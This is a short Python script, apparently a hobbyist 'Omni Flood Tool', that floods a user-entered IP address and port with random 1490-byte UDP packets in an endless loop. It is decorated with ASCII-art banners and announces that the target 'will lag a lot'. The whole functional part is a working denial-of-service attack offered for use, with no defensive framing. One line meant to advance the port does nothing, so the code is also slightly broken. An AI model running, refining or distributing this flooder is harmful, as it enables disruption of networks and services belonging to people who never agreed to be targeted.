import sys
import os
import time
import socket
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
print 
print("      ~ Omni Flood Tool :) ~");
print(

    """                 
    
                                                                    ..;===+.
                                                                .:=iiiiii=+=
                                                             .=i))=;::+)i=+,
                                                          ,=i);)I)))I):=i=;
                                                       .=i==))))ii)))I:i++
                                                     +)+))iiiiiiii))I=i+:'
                                .,:;;++++++;:,.       )iii+:::;iii))+i='
                             .:;++=iiiiiiiiii=++;.    =::,,,:::=i));=+'
                           ,;+==ii)))))))))))ii==+;,      ,,,:=i))+=:
                         ,;+=ii))))))IIIIII))))ii===;.    ,,:=i)=i+
                        ;+=ii)))IIIIITIIIIII))))iiii=+,   ,:=));=,
                      ,+=i))IIIIIITTTTTITIIIIII)))I)i=+,,:+i)=i+
                     ,+i))IIIIIITTTTTTTTTTTTI))IIII))i=::i))i='
                    ,=i))IIIIITLLTTTTTTTTTTIITTTTIII)+;+i)+i`
                    =i))IIITTLTLTTTTTTTTTIITTLLTTTII+:i)ii:'
                   +i))IITTTLLLTTTTTTTTTTTTLLLTTTT+:i)))=,
                   =))ITTTTTTTTTTTLTTTTTTLLLLLLTi:=)IIiii;
                  .i)IIITTTTTTTTLTTTITLLLLLLLT);=)I)))))i;
                  :))IIITTTTTLTTTTTTLLHLLLLL);=)II)IIIIi=:
                  :i)IIITTTTTTTTTLLLHLLHLL)+=)II)ITTTI)i=
                  .i)IIITTTTITTLLLHHLLLL);=)II)ITTTTII)i+
                  =i)IIIIIITTLLLLLLHLL=:i)II)TTTTTTIII)i'
                +i)i)))IITTLLLLLLLLT=:i)II)TTTTLTTIII)i;
              +ii)i:)IITTLLTLLLLT=;+i)I)ITTTTLTTTII))i;
             =;)i=:,=)ITTTTLTTI=:i))I)TTTLLLTTTTTII)i;
           +i)ii::,  +)IIITI+:+i)I))TTTTLLTTTTTII))=,
         :=;)i=:,,    ,i++::i))I)ITTTTTTTTTTIIII)=+'
       .+ii)i=::,,   ,,::=i)))iIITTTTTTTTIIIII)=+
      ,==)ii=;:,,,,:::=ii)i)iIIIITIIITIIII))i+:'
     +=:))i==;:::;=iii)+)=  `:i)))IIIII)ii+'
   .+=:))iiiiiiii)))+ii;
  .+=;))iiiiii)));ii+
 .+=i:)))))))=+ii+
.;==i+::::=)i=;
,+==iiiiii+,
`+=+++;`
                      _____             __    _    __   
                     /  _  \   /\  /\   |  \ | |  |__|  
                     | | | |  /  \/  \  | | \| |   __   
                     | |_| |  | |  | |  | |\   |  |  |  
                     \_____/  |_|  |_|  |_| \__|  |__|  
                                    
"""
     
     );
     
ip = input("Target IP : ")
port = input("Enter Port : ")

print(type(port))
  
port = int(port)

print(
"""








                  -..-........`                  
               `://..``` ``.``.//-`               
             `:/-.              `-+:              
            .+:-`                 `-+.            
           ./+..`                   `+.           
          `+oo+.                    . o`          
          /.ym-o-                  `- ./          
          o +N/ss-`  `     ````    /`  o          
          /:/Ny.:..``..` ``...```  s- //          
           o`yo:shNNmhos++:+hmmhyo:s- s           
           .+++dMMMMMMMm/:/mMMMMMMh-.o.           
            s:somNNNmh/osy-/ymMMMMs-.h            
           ./ :o//-../odMNh//---::-``+`           
           ./.-.   .-`/NNNN.```  .- .o.           
            `/ydhs/: ``+yss`  :+sddo:`            
              +yoy-o`-..-..` `s-yoh:              
               o`+ss+///:-///o+o+`+               
               y .+o/+/:--////++: +               
               y: ``..:////-.... .+               
               `/:-`` ..:-.` ``/::                
                  `:/-.``....::`                  
                     -:---::-                     
                     
                     """);
                     
sent = 0
print("      ~ FLOODING STARTED YOU WILL LAG A LOT ~")

while True:
    sock.sendto(bytes, (ip,port))
    sent = sent + 1
    port - port + 1
    if port == 65534:
        port = 80
        